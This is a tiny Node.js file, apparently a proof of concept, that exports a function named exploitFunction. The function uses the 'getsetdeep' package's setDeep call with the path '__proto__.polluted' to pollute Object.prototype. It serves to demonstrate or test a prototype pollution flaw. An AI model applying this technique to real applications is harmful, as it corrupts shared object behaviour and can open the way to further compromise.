const pkg = require("getsetdeep");

function exploitFunction(payload) {
    pkg.setDeep(payload.obj, "__proto__.polluted", "yes");
}

module.exports = { exploitFunction };